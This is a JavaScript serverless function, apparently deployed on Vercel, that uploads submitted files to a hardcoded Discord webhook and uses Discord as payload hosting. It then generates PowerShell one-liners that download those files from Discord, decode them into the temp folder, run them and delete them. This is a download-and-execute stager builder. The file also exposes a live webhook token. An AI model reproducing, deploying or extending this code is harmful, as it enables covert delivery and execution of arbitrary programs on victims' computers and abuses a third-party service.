const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// На Vercel bodyParser включен по умолчанию для JSON
// Мы его НЕ отключаем, чтобы req.body работал автоматически

async function uploadToDiscord(base64Content, filename) {
  return new Promise((resolve, reject) => {
    try {
      const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
      const boundary = '----Boundary' + Math.random().toString(36).substring(2);
      
      const payload = Buffer.concat([
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
        Buffer.from(base64Content, 'base64'), // Декодируем обратно в буфер для отправки
        Buffer.from(`\r\n--${boundary}--\r\n`)
      ]);

      const url = new URL(DISCORD_WEBHOOK);
      const req = https.request({
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': payload.length
        }
      }, res => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const json = JSON.parse(data);
            if (json.attachments && json.attachments[0]) {
              resolve({ url: json.attachments[0].url, name: filename });
            } else {
              reject(new Error('Discord API failed to upload: ' + data));
            }
          } catch (e) {
            reject(new Error('Discord returned invalid JSON: ' + data));
          }
        });
      });

      req.on('error', (err) => reject(new Error('Request to Discord failed: ' + err.message)));
      req.write(payload);
      req.end();
    } catch (e) {
      reject(new Error('Internal upload logic error: ' + e.message));
    }
  });
}

function sendFinalMessage(content) {
  return new Promise((resolve) => {
    try {
      const data = JSON.stringify({ content });
      const req = https.request(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
      }, res => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      });
      req.on('error', () => resolve()); // Игнорируем ошибки финального сообщения
      req.write(data);
      req.end();
    } catch (e) {
      resolve();
    }
  });
}

module.exports = async (req, res) => {
  // CORS заголовки
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed. Use POST' });
  }

  try {
    // На Vercel с включенным bodyParser данные уже в req.body
    const { files } = req.body;

    if (!files || !Array.isArray(files) || files.length === 0) {
      return res.status(400).json({ success: false, error: 'No files provided in request body' });
    }

    const uploadResults = [];
    for (const file of files) {
      if (!file.content || !file.filename) {
        throw new Error('Invalid file data: missing content or filename');
      }
      const uploaded = await uploadToDiscord(file.content, file.filename);
      uploadResults.push(uploaded);
    }

    // Генерация команды PowerShell
    let cmd = '';
    if (uploadResults.length === 1) {
      const r = uploadResults[0];
      cmd = `powershell -c "$t=\\"$env:TEMP\\${r.name}\\";$u='${r.url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
    } else {
      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
      uploadResults.forEach((r, i) => {
        const idx = i + 1;
        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
        startParts.push(`Start-Process $t${idx} -Wait`);
        tVars.push(`$t${idx}`);
      });
      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
    }

    // Отправляем финальное сообщение в Discord
    await sendFinalMessage(`📁 **${uploadResults.map(r => r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\``);

    return res.status(200).json({
      success: true,
      command: cmd
    });

  } catch (error) {
    console.error('SERVER ERROR:', error);
    return res.status(500).json({
      success: false,
      error: 'Cloud Server Error: ' + error.message
    });
  }
};
